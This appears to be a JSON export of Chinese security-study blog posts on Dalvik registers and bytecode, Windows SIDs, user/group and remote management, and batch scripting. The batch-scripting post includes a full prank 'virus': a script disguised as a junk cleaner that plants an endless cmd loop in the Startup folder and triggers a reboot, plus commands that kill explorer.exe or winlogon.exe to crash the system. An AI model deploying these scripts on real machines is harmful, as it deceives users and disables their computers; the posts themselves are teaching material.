Dalvik寄存器Dalvik虚拟机是基于寄存器架构的，其代码中使用了大量的寄存器。Dalvik虚拟机运行在ARM架构的CPU上。ARM架构的CPU本身集成了多个寄存器，Dalvik将部分寄存器映射到了ARM寄存器上，还有一部分通过调用栈进行模拟。（映射到ARM寄存器比较好理解，但是调用栈模拟寄存器的过程较为复杂，这部分等到一周目后再作讨论） Dalvik使用的寄存器都是32位的，支持所有类型。对于64位类型，可以用两个相邻的寄存器来表示。 Dalvik虚拟机支持65536个寄存器。根据Dalvik指令格式表，可以发现形如 “ØØ|op AAAA BBBB” 的指令，它的语法格式为 “op vAAAA, vBBBB”，其中每个字母代表4位。AAAA或BBBB的最大值是2的16次方-1，即65535。因此DVM寄存器的范围是v0~v65535。 寄存器命名法前面提到了，相比使用”v“命名法的dexdump，使用”p“命名法的baksmali反汇编工具更为主流；下面来看看这两类命名法有哪些区别。 首先来看v命名法，寄存器命名从 v0 开始递增。对于foo()函数，v命名法使用 v0, v1, v2, v3, v4 共5个寄存器， v0 与 v1 表示函数的局部变量寄存器，v2 用于表示被传入的Hello对象引用，v3 与 v4 分别用于表示两个传入的整型参数。 再看p命名法，对于foo()函数，p命名法使用 v0, v1, p0, p1, p2 共5个寄存器，v0 与 v1 同样用于表示函数的局部变量寄存器；p0用于表示被传入的 Hello 对象引用，p1 和 p2 分别用于表示两个传入的整型参数。 通过比较可以发现，在使用寄存器较多的情况下，p命名法更容易判断到底是局部变量寄存器还是参数寄存器，因而更为主流。对于有M个寄存器和N个参数的函数来说，可以将规律总结为下表： v命名法 p命名法 寄存器含义 v0 v0 第1个局部变量寄存器 v1 v1 第2个局部变量寄存器 …… …… 依次递增，且两者相同 vM-N p0 第1个参数寄存器 …… …… 依次递增，两者不同 vM-1 pN-1 第N个参数寄存器 Dalvik字节码Dalvik字节码有自己的类型，方法及字段的表示方法，这些内容与Dalvik虚拟机指令集一起组成了Dalvik汇编代码。 类型Dalvik 字节码只有两种类型，分别是基本类型和引用类型。Dalvik 使用这两种类型来表示 Java 语言的全部类型。除了对象和数组属于引用对象，其它的 Java 类型都属于基本类型。Java 语言的类型与 Dalvik 字节码类型描述符的对应关系如下表所示： 语法 含义 v void，只用于返回值类型 Z boolean B byte S short C char I int J long F float D double L Java类类型 [ 数组类型 对于上述的类型对照表，这里通过下表中几个实际的例子进一步来理解对应关系： Dalvik汇编代码 Java代码 Lpackage/name/ObjectName; package.name.ObjectName Ljava/lang/String; java.lang.String [I int[] [[ int[] []（最大维数为255） [Ljava/lang/String; String[] 每个Dalvik寄存器都是32位的。对长度小于或等于32位的类型来说，只用一个寄存器就可以存放该类型的值，而对 J 、D 等64位的类型来说，它门的值要使用相邻的两个寄存器来存储，例如 v0 与 v1、v3 与 v4。 方法方法的表现形式要比类型复杂一些。Dalvik使用方法名、类型参数与返回值来描述一个方法。格式如下： smali1Lpackage/name/ObjectName;->MethodName(III)Z Lpackage/name/ObjectName;：类型 MethodName：方法名 (III)Z：方法的签名部分： III：方法的参数 Z：方法的返回类型 来看一个复杂点的例子： smali1method(I[[IILjava/lang/String;[Ljava/lang/Object;)Ljava/lang/String 转换成 Java 代码后如下： java1String method(int, int[][], int, String, Object[]) 经过 baksmali 生成的方法代码以 .method 指令开始，以 .end method 指令结束，根据方法类型的不同，在方法指令前可能会用 ‘#’ 来添加注释。例如，”# virtual methods“ 表示这是一个虚方法， “# direct methods“ 表示这是一个直接方法。 字段字段与方法相似，只是字段没有方法签名域中的参数和返回值，取而代之的是字段的类型。其格式如下： smali1Lpackage/name/ObjectName;->FieldName:Ljava/lang/String; Lpackage/name/ObjectName;：类型 FieldName：字段名 Ljava/lang/String;：字段类型 baksmali生成的字段代码以 .field 指令开头，表现形式与方法类似，例如，”# instance fields“ 表示这是一个实例字段， “# static fields“ 表示这是一个静态字段。 参考资料参考书籍：《Android软件安全权威指南》—— 丰生强 参考链接： https://source.android.com/devices/tech/dalvik/instruction-formats (官方文档-Dalvik可执行指令格式) https://source.android.com/devices/tech/dalvik/dalvik-bytecode#instructions (官方文档-Dalvik字节码) https://source.android.com/devices/tech/dalvik/dex-format (官方文档-Dalvik可执行文件格式) https://blog.csdn.net/p312011150/article/details/80501724 (CSDN-Android Dex文件格式II)","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://cata1oc.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"网络安全基础03(下)：用户与组管理","slug":"网络安全基础03-下-用户与组管理","date":"2020-06-18T02:00:49.000Z","updated":"2022-05-17T15:10:56.154Z","comments":true,"path":"2020/06/18/网络安全基础03-下-用户与组管理/","link":"","permalink":"http://cata1oc.github.io/2020/06/18/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8B-%E7%94%A8%E6%88%B7%E4%B8%8E%E7%BB%84%E7%AE%A1%E7%90%86/","excerpt":"","text":"前言原本是一个课时的内容，但是上篇的内容写的有些冗杂，导致没法塞在一篇内，本篇介绍用户与组管理，会尽量做到精炼。 本篇分为4个部分，第1部分介绍SID概念以及与用户之间的关系，第2部分介绍用户管理的方式以及相关命令，第3，4部分分别介绍组管理与服务器远程管理的相关内容（注：大部分实验均在Windows2003上完成，远程管理部分用到WindowsXP配合实验） SID(Security Identifiers)含义SID，安全标识符（Security Identifiers），是标识用户，组和计算机账户的唯一的号码；相对于计算机账户的身份证号，是唯一的，可标识身份用的。 组成Code12系统SID： S-1-5-21-3072888247-3196847064-770484880-500用户SID： S-1-5-21-3072888247-3196847064-770484880-1004 观察上面两个SID，来简单分析一下结构 S：表示该字符串是 SID。 1：SID的版本号，对于Windows 2000/xp/2003这几个版本来说就是1。 5：标识符的颁发机构：对于Windows 2000/xp/2003来说，颁发机构就是NT，值是5。 21***880：代表着一系列子颁发机构。 500/1004(UID)：标志着域内的账户和组。Windows系统管理员Administrator的UID是500，普通用户是从1000开始。（扩展：Linux系统管理员root的UID是0） 查看使用下述指令可以查看当前账户的SID dos1whoami /user 配合SAM文件进行登录认证SAM文件即账号密码数据库文件，当我们登录系统时，系统会根据输入的SID和密码自动地去和SAM中的值进行校对。若匹配成功，即可完成登录。 SAM文件存储方式：在创建用户时，会通过不可逆算法将密码以哈希值存储在（%SystemRoot%\\system32\\config\\SAM）中。 SAM文件校验方式：校验时，将用户输入的密码以同样的算法算出哈希值，并与SAM文件中对应SID的哈希值进行比较。 用户管理内置用户一般来说，第一次进入Windows系统时会有一些内置用户，可以通过命令： dos1net user 进行查看（这里为了看的方便，先执行了color f3指令改了下配色）： 也可以在图形化界面中，右键我的电脑 -> 管理 -> 系统工具 -> 本地用户和组 -> 用户，找到内置用户以及自己创建的用户。 可以巧妙的发现，内置用户都是有描述信息的，这也是一种判断内置用户和创建用户的方式。 用户权限不同用户具有不同的权限，以Administrator用户来说，它具有至高无上的权限，做任何事，执行任何指令都不受到限制；但是普通用户就不一样，具有较低的权限，执行指令也会受到限制；而Guest用户，权限就更低了。下面来以User_0x1（创建的一个普通用户）身份执行一些命令，查看结果。 执行一些命令可以发现，作为一个普通用户，不能修改自己的密码，不能访问Administrator所属文件夹，甚至连关机都不可以（Windows2003作为服务器系统，对于关机的操作很是谨慎，仅Administrator用户可以进行关机），可以理解，不同用户的权限是不一样的。 用户管理命令作为Administrator用户，经常需要一些操作来完成对用户的管理，Windows提供了一些Dos指令，使得这些操作可以更方便的完成： dos123456net user #查看所有用户net user 用户名 字符串 #修改密码net user 用户名 #查看指定用户信息net user 用户名 密码 /add #新建用户net user 用户名 密码 /del #删除用户net user 用户名 /active:yes/no #激活或禁用用户 组管理单个用户的权限赋予（下一篇会讲到）会很好操作，但是如果管理一批用户，赋予权限就是一件麻烦的事情了，所以有了组的概念。组的作用就是简化权限的赋予，在没有组的情况下，需要对用户一个个进行权限赋予；有了组以后，仅需要给组赋予相应的权限，然后将一批需要被赋予相同权限的用户放入这个组里。 内置组Windows提供了内置组，可通过命令： dos1net localgroup 进行查看 也可以在图形化界面中，右键我的电脑 -> 管理 -> 系统工具 -> 本地用户和组 -> 组，找到系统提供的内置组： 对于不同类型的组，也有相应的描述。其中Administrator所在的组为Administrators，也就是说分在这个组里的用户，拥有至高无上的权限。 修改用户权限有了组的概念，我们尝试修改普通用户User_0x1的权限。 先看图，再分析一下步骤： 首先切换到Administrator用户，使用命令： dos1net localgroup Administrators 查看Administrators组的成员，发现只有Administrator一个用户。 接着使用命令： dos1net localgroup Administrators User_0x1 /add 来添加用户User_0x1进入Administrators组中，再次查看Administratos组成员时，已成功添加。 这是我们切换到User_0x1用户登录： 发现User_0x1用户不受限制 ，执行任意命令了。当然，为了安全起见，最后还是要切换回Administrator用户，通过命令： dos1net localgroup Administrators User_0x1 /del 将User_0x1移出Administrators组。 组管理命令下面是一些常用的组管理命令： dos123456net localgroup #查看组net localgroup 组名 #查看组net localgroup 组名 /add #创建组net localgroup 组名 用户名 /add #添加组成员net localgroup 组名 用户名 /del #删除组成员net localgroup 组名 /del #删除组 服务器远程管理远程管理可以让用户远程登录服务器进行操作，提高了便捷度和办公效率，远程管理分为图形化和命令行两种。 图形界面依旧来看以下几个步骤，开启图形化远程管理： 右键我的电脑 -> 属性 -> 远程 -> 选择远程用户 可以看到，我这里已经添加了2个用户User_0x1和User_0x2，当然Administrator默认拥有过访问权。当然，最重要的一步，是在远程界面里选择启用这台计算机上的远程桌面。 在命令行中，执行命令： dos1netstat -an 查看已开放的端口，注意一个端口，3389端口，该端口是Windows2003系统下远程桌面的服务端口，这里可以看到，该端口是开启的，可以进行远程访问。 打开一台xp虚拟机，这里要先保证能够ping通服务器的Windows2003系统，Windows+R进入运行，输入mstsc，然后进入 。 输入目标服务器的IP地址后（ping通时也会用到），点击连接，进入登录界面，但是注意，此时仍然处于xp虚拟机中，但是已经进入了Windows2003的登入界面。 输入正确的密码进入后，可以发现，已经完全进入了Windows2003的界面，实现了远程操控。 命令行界面除了可以通过图形界面远程访问服务器，也可以通过命令行远程访问，但这用的就不是同一个端口了。 首先Windows+R，进入运行，输入services.msc并回车，进入服务窗口 找到Telnet服务 右键属性，先将启动类型改为自动，并应用，然后点击启动，便可以启动Telnet服务 接着打开命令行，可以发现Telnet服务所开放的23端口已经打开 打开Windows XP，进入命令行，通过命令： dos1telnet 服务器IP 试图连接服务器 会遇到一个判断，选择y 进入到登录界面，输入用户名和密码，注意这里密码是没有回显的(类似Linux)，输入完后回车就可以 登录成功后，发现，自己已经可以进入Windows2003服务器中的文件夹中。 成功完成服务器的远程访问。 使用exit命令，可以断开与服务器的连接 小结由于图片过多，利用漏洞破解Win7密码的内容将会单独开一篇博客讨论。 参考链接 https://www.bilibili.com/video/BV1i7411G7vm?p=16 (千峰开源网络安全教程p16~p18) https://www.cnblogs.com/mq0036/p/3518542.html (博客园-Windows中的SID详解) https://blog.csdn.net/shennongzhaizhu/article/details/52435519 (CSDN-Windows中的SAM文件) https://blog.csdn.net/weixin_43252204/article/details/105338527 (Beglage_buglige的学习笔记) https://social.microsoft.com/Forums/zh-CN/9a1e271d-03f5-4263-acda-80a64804d574/21313199752877924613-support388945a0-349872555226435-358313617625945?forum=windowsserversystemzhchs (Support_388945a0用户对应的组)","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://cata1oc.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"网络安全基础03(上)：批处理与病毒","slug":"网络安全基础03-上-批处理与病毒","date":"2020-06-15T08:35:03.000Z","updated":"2022-05-17T15:10:10.531Z","comments":true,"path":"2020/06/15/网络安全基础03-上-批处理与病毒/","link":"","permalink":"http://cata1oc.github.io/2020/06/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E4%B8%8A-%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E7%97%85%E6%AF%92/","excerpt":"","text":"批处理什么是批处理在前面的文章中学习过Dos命令，单一的Dos命令能实现特定的功能，但功能较为单一；一行一行在命令行中输入Dos命令效率又不够高，因而产生一种方式，将这些Dos命令组织起来，并按照指令的顺序成批进行处理。这就是批处理，又被叫做脚本。 在Windows中，批处理是将Dos命令按照顺序组织起来成批执行；在Linux中也有一种形式，将bash命令组织起来成批执行，这种经过组织后的文件被称作Shell脚本。 如何创建批处理新建一个文本文件，将后缀改为.bat形式保存，就得到了一个批处理文件，然后用记事本编辑即可。但是有些情况下，我们无法修改文件的后缀，此时需要做一个修改。打开Windows资源管理器 -> 工具 -> 文件夹选项 -> 查看，在高级设置中，有一个选项，隐藏已知文件类型的扩展名，将该扩展名的勾选去除，便可以修改文件后缀了。（注：本篇中的实验均基于Windows2003/WindowsXp，别的版本代码会有所改动） 接下来，我们可以应用前一篇学到的Dos命令，写一个批处理文件，用来打印一些语句，编辑完，双击即可运行批处理文件。 运行的结果看着很不友好，下面我们将学习更多的指令来对代码进行优化。 关闭回显与空行批处理虽然的对代码成批进行处理，但真正执行时也只是一条条的指令进行执行。回顾刚刚的代码，命令行在执行时，将Dos命令一条条打印出来，再执行，这样视觉上很不美观，考虑不显示执行的语句，可以采用以下命令： dos1@echo off 在批处理的开头，输入该指令，执行时就不会显示执行的指令了。此外，批处理在处理的过程中，是不会处理文件中的空行的，遇到会直接跳过，执行下一条Dos指令，这样难道就没法在批处理中打印空行了吗？同样，针对这一点Windows也提供了一条命令 ： dos1echo. 该指令将会打印一行空行，可以理解为python中的print()或C++中cout < endl;的作用。>或C中scanf()功能的效果: 图中，name获取到的不是值，而是显示在命令行中的语句，接下来用户输入的值，才会赋给变量name。接下再打印name的值。有了/p参数，我们便可以从命令行中获取参数，增加程序的交互性。 条件分支任何一门语言中，都会有条件分支，根据不同的条件，执行不同的代码。Windows也提供了相应的Dos命令，if和goto。这两个命令相互间配合，就可以做到类似switch语句实现的条件跳转。下面来看一下定义： dos12345678910111. 命令：goto 含义：程序跳转到某个区块 语法：goto menu (跳转到menu区块)2. 命令：： 含义：定义一个区块 语法：：menu (定义menu区块)3. 命令：if 含义：条件判断 语法：if %a%==\"1\" goto (如果变量a的值为1，则跳转到menu区块继续接下来执行) 有了这几条指令后，我们可以写一个小的批处理测试一下： 该批处理，实现很简单的功能，根据按下的数字为1还是2，打印相应的语句。 批处理小实验在对批处理和大部分常用命令有所了解后，来进行一个练习，再做练习之前，需要再掌握一个指令： dos1231. 命令：net user 含义：修改指定用户的密码 语法：net user admin 123456 (修改admin用户的密码为123456) 该指令用于修改用户密码，在练习中会用到。 这里练习编写一个批处理文件，能够实现一个简单的菜单功能，功能包括修改用户密码，定时关机以及退出。 我这里参照Beglage_buglige的代码，实现了一份类似功能的，执行效果如下： 难度不大，可以先自己尝试，这里附上代码 dos1234567891011121314151617181920212223242526272829303132333435363738@echo offtitle are you ok?color f3:menuecho ----------------echo Menuecho 1.Modify Password echo 2.SetTime Shutdownecho 3.Exitecho ----------------set /p num=您的选择是： if \"%num%\"==\"1\" goto 1if \"%num%\"==\"2\" goto 2if \"%num%\"==\"3\" goto 3echo Don't do that!pausegoto menu:1set /p u=username:set /p p=password:net user %u% %p% >nulecho Modify Password Succeedpausegoto menu:2set /p time=Input Time:shutdown -s -t %time%set /p cancel=Cancel or Not(0 or 1)?if %cancel%==1 shutdown -agoto menu:3exit 病毒这里提到的病毒，不能算真正的病毒，可以认为是一些整人的手段或把戏。因为这些病毒是基于Dos命令，进行磁盘文件的修改等操作，如果同样有过Dos命令经验的人，就很容易识破这样的把戏。真正的病毒大多要涉及到操作系统底层的修改，更偏向二进制方面。 无限CMD首先来看简单的无限CMD的实现，仅仅需要3行指令即可实现： dos123:Infstart cmdgoto Inf 效果如下： 这里补充说明一下start命令。 dos121. 命令：start/start cmd 含义：新打开一个命令行窗口 虽然无限CMD很好实现，但是有所警惕的人一般不会点开，这时我们就需要给这个代码做一点伪装。 伪装杀毒软件这里先来看代码，然后再分析这个代码做了什么： 先来看第一部分： dos12345678@echo offecho.cd c:\\md aecho :start > C:\\a\\virus.batecho start cmd >> C:\\a\\virus.batecho goto start >> C:\\a\\virus.batcopy C:\\a\\virus.bat \"C:\\Documents and Settings\\Administrator\\「开始」菜单\\程序\\启动\\\" >nul 这里首先是关闭命令的显示，切换到C盘，创建一个文件夹a。 然后使用echo指令，在文件夹a中创建批处理文件virus.bat，并将无限打开cmd的指令写入。 接着将该批处理文件复制到当前用户的 ”启动“ 文件夹下，这个文件夹有啥用呢？这是Windows开机自启动的文件夹，当电脑开机后，Windows会自动执行该文件夹下的程序，当我们把无限cmd批处理放到该目录下时，每当电脑启动时，就会进入这样的死循环，这样的恶作剧会让用户很是头疼。但每个平台下的路径是不一样的，用户名也不一样，如何写出一个通用的指令呢？这时需要用到一个系统变量%UserProfile%，前面讲到了，用Set设置的变量可以通过%*%的形式获取到它的值，这个变量就是系统变量，Windows中定义了很多系统变量（可以参考此篇），%UserProfile%就是其中之一，它对应的值则是”C:\\User\\用户名”， 可以看到，我这里UserProfile对应的就是 “C:\\Documents and Settings\\Administrator” ，所以我们可以把 dos1copy C:\\a\\virus.bat \"C:\\Documents and Settings\\Administrator\\「开始」菜单\\程序\\启动\\\" >nul 改成 dos1copy C:\\a\\virus.bat \"%USERPROFILE%\\「开始」菜单\\程序\\启动\\\" >nul 这样就可以在WindowsXP/Windows2003的系统上完成功能的实现了，当然对于别的版本的Windows路径可能会有所不同，需要做相应修改。 然后我们来看剩下的部分： dos12345678910111213141516171819echo ====== 垃圾清理中，请不要关闭窗口======echo.ping -n 2 127.0.0.1 >nulecho ====== 垃圾清理完毕，共清理垃圾500M ======echo.echo ====== 建议立即重启电脑 ======echo.set /p u=是否重启电脑(y/n):if %u%==\"y\" goto spauseexit:sshutdown -r -t 1:errorecho ====== 程序运行失败，请使用【管理员权限】重新运行！======pauseexit 这部分，主要是打印出一个界面，在Dos中看到一个界面，让人误以为是个杀毒软件，然后按照你的步骤执行 值得注意的是那条ping语句，输出通过>nul丢掉了，但是依旧会执行，”-n“ 这个参数用来设置发包的数量，这条ping语句的作用就是，给人一种有程序正在执行的感觉（发包越多，等待时间越长），让人误以为正在进行电脑垃圾清理。 最后是一条重启电脑指令，这样，等到重启后，电脑就会因为开机自动打开无限CMD的脚本，最终至死机 执行时，表现如下： 可以看到，生成的virus.bat会被写入到 “启动” 文件夹的位置，并且提示是否需要重启，若重启，则开机后便会后上面的无限CMD结果一样。 杀死桌面桌面也是可以被杀死的，桌面存在的原因是为了能够让电脑使用起来更加方面，从而打造的GUI界面。但是桌面也只是一个进程（explorer.exe），在开机时该进程会启动而已。所以我们只需要关掉这个进程，就可以杀死桌面，下面介绍一条指令： dos1234561. 命令：taskkill 描述：按照进程PID或映像名称终止任务 参数：/pid (指定要终止的进程的pid,使用tasklist取得pid) /im (指定要终止的进程映像名称) /f (强制终止进程) 用法：taskkill /im explorer.exe /f 执行时状态如下： 那桌面被杀死了，该如何使用呢？这是只需要将explorer.exe进程重新启起来就行，该程序通常位于 “c:\\windows” 目录下，可以使用指令： dos1start C:\\windows\\explorer.exe 重启桌面进程，效果如下： 蓝屏这里涉及到一个调试工具ntsd，该调试工具主要位于WindowsXP/2003版本中，可以用来强制结束进程。刚刚的taskkill不也可以结束进程吗？为什么需要ntsd？来看一个例子： taskkill并不能结束所有进程，所以这时候就需要ntsd。这里出现的winlogon.exe又是什么进程呢？winlogon.exe是一个系统核心进程，用于管理用户登录和退出。强行关闭则会引起蓝屏。下面简要说明下ntsd的语法： dos12341. 命令：ntsd 含义：强行关闭进程 语法：ntsd -c q -p pid (根据pid关闭进程) ntsd -c q -pn ***.exe (根据映像名关闭进程) 可以尝试在WindowsXP/2003中执行如下指令： dos1ntsd -c q -pn winlogon.exe 结果显而易见，蓝屏并重启。 参考链接： https://www.bilibili.com/video/BV1i7411G7vm?p=14 （千峰网络开源课程p14~p15） https://blog.csdn.net/weixin_43252204/article/details/105389619 （Beglage_buglige关于本篇内容的学习笔记） https://blog.csdn.net/evilcry2012/article/details/79447194 （CSDN博客-系统变量与路径的对应关系）","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://cata1oc.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"Dalvik虚拟机","slug":"Dalvik虚拟机","date":"2020-06-09T14:31:40.000Z","updated":"2022-05-17T15:09:15.549Z","comments":true,"path":"2020/06/09/Dalvik虚拟机/","link":"","permalink":"http://cata1oc.github.io/2020/06/09/Dalvik%E8%99%9A%E6%8B%9F%E6%9C%BA/","excerpt":"","text":"前言想要去逆向分析一个程序，那就得了解它所在平台底层的知识，学习如何分析Android程序的之前，了解Dalvik虚拟机是必不可少的环节。本篇就Android运行依赖的Dalvik虚拟机（尽管现在都是ART虚拟机了，但Dalvik虚拟机仍有学习的价值，就像学习Windows内核，不都是从xp开始的嘛）作简单的介绍，下一篇会介绍Dalvik语言基础，为之后学习Dalvik指令打下基础。 关于Dalvik虚拟机Android系统的应用层是采用Java开发的（Java是主流，现Google全面推行Kotlin），由于Java语言的跨平台特性，所以Java的代码必须运行在虚拟机中。正因为这个特性，Android系统也实现了自己的一个类似JVM但是更适合嵌入式平台的虚拟机——Dalvik。Dalvik的功能等同于JVM，为Android平台上的Java代码提供了运行环境。 Dalvik虚拟机的特点 体积小，占用内存空间少（与JVM相比） 专有的DEX（Dalvik Executable）可执行文件格式，体积小，执行速度快（与.class相比） 基于寄存器架构，同时拥有一套完整的指令系统（JVM基于栈架构） 所有的Android程序都运行在Android系统进程中，每个进程都与一个Dalvik虚拟机实例对应。（基于Zygote） Dalvik虚拟机与Java虚拟机的区别DVM与传统的JVM有诸多显著区别，具体如下（二者亦不兼容） 运行的字节码不同JVM：运行Java字节码（.java文件 -> .class文件(保存Java字节码)） DVM：运行Dalvik字节码（.class -> .dex(保存Dalvik字节码)） Dalvik可执行文件的体积更小一般来说，一个Java的应用程序会打包成jar的形式发布在相应平台。一个jar会包含若干个.class文件；Android的应用程序则会把一个.dex文件打包成.apk文件，并且一个.apk文件中仅包含一个.dex文件。而.dex文件又都是由.class文件转换而来的（由Android SDK提供的”dx”工具完成转换的工作）。从描述上看，似乎.dex文件比.class文件更紧凑。下面来看一张图： 这张图充分说明了为什么Dalvik可执行文件的体积更小。Java类文件中通常有多个方法签名，如果其它类文件引用了该类文件中的方法，相应的方法签名也会被复制到其它类文件中。也就是说，如果多个不同的类同时包含相同的方法签名，则大量的字符串常量会被多个类文件重复使用。这些冗余信息造成了文件体积增大，严重影响了虚拟机解析文件的效率。 相反，dx在对Java文件转换为DEX文件时，对所有的Java类文件中的常量池进行了分解，并重新组合成一个常量池，让所有类文件共享这个常量池，这也使得DEX文件体积要小很多。 虚拟机架构不同在前面说到特点时，就提到DVM是基于寄存器架构的，而JVM是基于栈架构的。仅从架构上来看，DVM就已经优势无限大，栈是位于内存中的，这就意味着当Java程序运行时，不断对栈的读写操作会进行大量内存访问，会耗费大量CPU时间。这对于资源有限的设备（手机）来说，无疑是笔巨大的开销。相比之下，寄存器的读取要快许多。 书中用一个程序举例，对比分析了Java字节码与Dalvik字节码的差异，由于我在本机上实验时，dx工具不能够支持，换了旧版本的build-tools同样不得行（找不出原因了）。所以这里就不给出文件转换的教程了，具体的文件转换步骤可以参考该文章。下面来看程序。 Java程序java12345678910public class Hello { public int foo(int a, int b){ return (a+b) * (a-b); } public static void main(String[] agrc){ Hello hello = new Hello(); System.out.println(hello.foo(5, 3)); }} 这个代码很好理解，定义了一个简单的函数并调用了一次。而我们关注的重点在于它经过编译生成后的字节码。 Java字节码的foo()函数部分Code1234567891011public int foo(int, int); Code: 0: iload_1 1: iload_2 2: iadd 3: iload_1 4: iload_2 5: isub 6: imul 7: ireturn ... 这部分截取了.class文件中foo()函数的部分，想要理解这部分指令的含义，得先了解JVM的工作机制。 对Java程序来说，每个线程在执行时都有一个PC计数器和一个Java栈。PC计数器和x86架构CPU的IP（EIP）寄存器作用差不多，可以类比的理解。不同的在于PC计数器只对当前方法有效，Java虚拟机通过它的值来取指令执行。 Java栈和C语言调用函数的栈类似，在JVM中，每调用一个方法，就会分配一个新的栈帧并压入Java栈；每从一个方法返回，则弹出并撤销相应的栈帧。每个栈帧包括局部变量区，求值栈（JVM规范称作操作数栈），局部变量区用于存储方法的参数和局部变量，求值栈用于保存求值的中间结果及调用其它方法的参数等。 对JVM的一些机制稍作了解后，我们来看一下指令，先看第一个iload_1。这个指令要分为3部分来看： i：指令前缀，表示操作类型为int load：表示将局部变量存入Java栈 _1：索引，从0开始计数，表示要操作的是哪个局部变量，这里指第2个 拆分完后，就可以理解，iload_1表示使第2个int类型的局部变量入栈。 参考上图，这是JVM运行上面那段Java字节码时，栈帧的状态，可以看到，此时正准备执行iadd指令，在这之前，先取了第2个和第3个int参数入局部变量区，在执行iadd指令前，又从栈顶弹出两个int类型的值进入求值栈，并准备求它们的和。接下来的部分，也可以根据指令推断，首先在求和完了后会将结果压入求值栈的栈顶（求值栈用于保存求值的中间结果），第4条和第5条指令会再次将两个参数入栈，第6条指令进行求差，并把结果压回栈顶。此时求值栈中已经有两个int类型的值了。第7条指令imul用于从栈顶弹出两个int类型的值并求它们的积，把结果压回栈顶。第8条指令ireturn用于返回一个int类型的值。 这下是弄明白了Java字节码这部分指令的含义，关于更多JVM指令的含义，可以参考此篇文章。现在可以看到，Java字节码在执行行，会进行多次的压栈，出栈操作，这样会大量访问内存，耗费大量的CPU时间。所以，才有了Dalvik字节码的诞生。 Dalvik字节码的foo()函数部分Code1234567891011121314151617181920... Virtual methods - #0 : (in LHello;) name : 'foo' type : '(II)I' access : 0x0001 (PUBLIC) code - registers : 5 ins : 3 outs : 0 insns size : 6 16-bit code units000198: |[000198] Hello.foo:(II)I0001a8: 9000 0304 |0000: add-int v0, v3, v40001ac: 9101 0304 |0002: sub-int v1, v3, v40001b0: b210 |0004: mul-int/2addr v0, v10001b2: 0f00 |0005: return v0 catches : (none) positions : 0x0000 line=3 locals : 0x0000 - 0x0006 reg=2 this LHello;... Dalvik字节码这部分看上去很复杂，但实际上，很大一部分都是对函数的描述性的字段（这部分会在下一篇语言基础中讲到）。真正在实现foo()函数上，Dalvik字节码只使用了4条指令（Java字节码需要8条）。下面来看看它门的含义。 第1条指令add-int将v3和v4寄存器的值相加，结果存到v0寄存器中；第2条指令sub-int将v3和v4寄存器的值相减，将结果保存到v1寄存器中；第3条指令mul-int/2addr将v0和v1寄存器的值相乘，结果保存到v0寄存器中。第4条指令用于返回v0寄存器的值。 DVM运行时也为每个线程维护了一个PC计数器和一个调用栈。与JVM不同的是，这个调用栈维护了一个寄存器列表，寄存器的数量在方法结构体的registers字段中给出。DVM会根据这个值来创建一份虚拟的寄存器列表。DVM运行时的状态，可以参考下图： 通过比较JVM和DVM的运行状态以及实现同一功能的指令，可以发现与基于栈架构的JVM相比，基于寄存器架构的DVM生成的代码指令明显减少了，加上原本寄存器较内存更快的访问速度，使得DVM更适合资源有限的设备。 Dalvik虚拟机的执行流程Dalvik虚拟机的执行流程很复杂，如果展开讲，仅一个Zygote进程的启动流程，就够写两篇博客了。这里不拓展太多，结合书中内容介绍主体部分，了解个大概，等到一周目通关后，可再去研究Android进程启动等细节。 在了解虚拟机执行流程前，先来看张图，这是一张经典的Android系统组成的图。 通过这张图我们可以看到两点：Android系统基于Linux内核；DVM属于Android运行时环境，它与一些核心库一起承担了Android应用程序的运行工作。 Android系统启动并加载内核后，会立即执行init进程（Linux系统中，所有进程都是init进程的子孙进程，均由init进程fork出来，包括Zygote）。init进程先完成设备的初始化工作，再读取init.re文件并启动系统中的重要外部程序Zygote。 Zygote是Android系统中所有进程的孵化器进程。Zygote启动后，会先初始化Dalvik虚拟机（在AndroidRuntime的start函数中调用startVM启动虚拟机），再启动system_server进程（system_server进程负责启动系统的关键服务，如包管理服务PackageManagerService和应用程序组件管理服务ActivityManagerService）并进入Zygote模式，通过socket等候命令的下达（ZygoteInit的main函数中会调用runSelectLoopMode函数进入一个无限循环，在创建的socket接口等待ActivityManagerService发送的创建新的应用程序进程的请求）。这里提到的关于Zygote启动过程的细节，可以参考罗老师的Android系统进程Zygote启动过程的源代码分析，文章中讲的非常详细。也可以参考另一篇LooperJing的文章。建议安卓逆向一周目通关后把这两篇都看了。 在执行一个Android应用程序时，system_server进程通过Binder IPC方式将命令发送给Zygote（此时socket处已在等候命令），Zygote收到命令后，通过fork其自身创建一个Dalvik虚拟机的实例来执行应用程序的入口函数，从而完成应用程序的启动过程。过程可参考下图。详细细节可以参考罗老师的这篇文章。 Zygote提供了三种创建进程的方法： fork()：创建一个Zygote进程。 forkAndSpecialize()：创建一个非Zygote进程。 forkSystemServer()：创建一个系统服务进程。 Zygote进程可以再分成其它进程，非Zygote进程则不能再分成其它进程。系统服务进程终止后，其子进程也必须终止。 进程fork成功后，执行工作将交给DVM完成。DVM先通过loadClassFromDex()函数来装载类。每个类被成功解析后，都会获得运行时环境（DVM所属位置）中的一个ClassObject类型的数据结构存储（虚拟机使用gDvm.loadedClasses全局散列表来存储和查询所有装载进来的类）。接下来，字节码验证器使用dvmVerifyCodeFlow()函数对装入的代码进行校验，虚拟机调用FindClass()函数查找并装载main()方法类。最后，虚拟机调用dvmInterpret()函数来初始化解释器并执行字节码流。 以上就是DVM的执行流程，这里仅作了解即可，等一周目后再来仔细研究。 Dalvik虚拟机的执行方式即时编译（Just-in-time Compilation，JIT），又称动态编译，是一种通过在运行时将字节码翻译为机器码使得程序执行速度加快的技术。主流的JIT包括两种字节码编译方式： method方式：以函数或方法为单位进行编译。 trace方式：以trace为单位进行编译（trace方式即按照执行路径编译，比起method方式编译整个方法，trace更节省时间和内存）。 DVM默认采用trace方式编译，同时支持method方式。 